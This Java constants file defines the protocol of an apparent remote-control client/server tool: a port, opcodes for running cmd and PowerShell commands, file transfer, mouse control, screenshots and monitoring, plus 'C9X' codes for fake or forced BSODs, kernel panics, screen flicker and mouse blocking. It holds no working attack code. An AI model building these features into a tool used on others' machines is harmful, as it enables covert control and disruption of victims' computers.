package comms;

/*
 * Class Comms
 * A class that only consists of static constants for ports, commands and return values
 */
public class Comms {
	//Version Strings
	public static final String CLIENTVER = "CCLIENT.VER.0028.0x19:CMD_INFOEX.SINGLE_INSTANCE.2018.04.25";
	public static final String SERVERVER = "CSERVER.VER.0038.0x19:CMD_INFOEX.NULL.2018.01.02";

	//Ports
	public static final int PORT = 0x5D50;
	
	//Command Set
	public static final byte CMD_RUNCMD = 0x00;
	public static final byte CMD_RUNPS = 0x01;
	public static final byte CMD_RUNIN = 0x02;
	public static final byte CMD_FILE = 0x03;
	public static final byte CMD_RUNPSIN = 0x04;
	public static final byte CMD_LCLICK = 0x05;
	public static final byte CMD_RCLICK = 0x06;
	public static final byte CMD_MCLICK = 0x07;
	public static final byte CMD_MMOVE = 0x08;
	public static final byte CMD_SSHOT = 0x09;
	public static final byte CMD_KILL = 0x0A;
	public static final byte CMD_PROTECT = 0x0B;
	public static final byte CMD_SETTIMEOUT = 0x0C;
	public static final byte CMD_GETNAME = 0x0D;
	public static final byte CMD_INSERTSTR = 0x0E;
	public static final byte CMD_GETVER = 0x0F;
	public static final byte CMD_RAW = 0x10;
	public static final byte CMD_LDBLCLICK = 0x11;
	public static final byte CMD_MDOWN = 0x12;
	public static final byte CMD_MUP = 0x13;
	public static final byte CMD_MONITOR = 0x14;
	public static final byte CMD_INFO = 0x15;
	public static final byte CMD_RAWIN = 0x16;
	public static final byte CMD_C9X = 0x17;
	public static final byte CMD_JVMNAME = 0x18;
	public static final byte CMD_INFOEX = 0x19;
	
	//Monitor commands
	public static final byte MON_CMD_EXIT = 0x00;
	
	//Command Return Values
	public static final byte RET_SUCCESS = 0x00;
	public static final byte RET_ERR = 0x01;
	
	//C9x byte codes
	public static final byte C9X_INVALID = 0x00;
	public static final byte C9X_GPANEL = 0x01;
	public static final byte C9X_FLICKER = 0x02;
	public static final byte C9X_MBLOCKER = 0x03;
	public static final byte C9X_BSODWIN10 = 0x04;
	public static final byte C9X_BSODWIN7 = 0x05;
	public static final byte C9X_KPMACOSX = 0x06;
	public static final byte C9X_KPLINUX = 0x07;
	public static final byte C9X_BSODAUTO = 0x08;
}
